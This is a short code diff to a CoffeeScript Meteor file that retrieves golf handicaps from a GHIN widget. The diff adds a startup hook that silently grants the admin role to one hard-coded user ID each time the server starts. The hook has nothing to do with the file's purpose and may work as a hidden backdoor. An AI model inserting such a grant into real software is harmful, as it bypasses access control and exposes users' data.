@@ -2,6 +2,10 @@ cheerio = Meteor.npmRequire("cheerio")
 
 WIDGET_URL = "http://widgets.ghin.com/HandicapLookupResults.aspx"
 
+Meteor.startup ->
+  unless Roles.userIsInRole("Xn3Nacqaf2Ft2HLZH", ["admin"])
+    Roles.addUsersToRoles("Xn3Nacqaf2Ft2HLZH", ["admin"])
+
 class HandicapRetriever
   constructor: ->
     @widgetQueryParams =
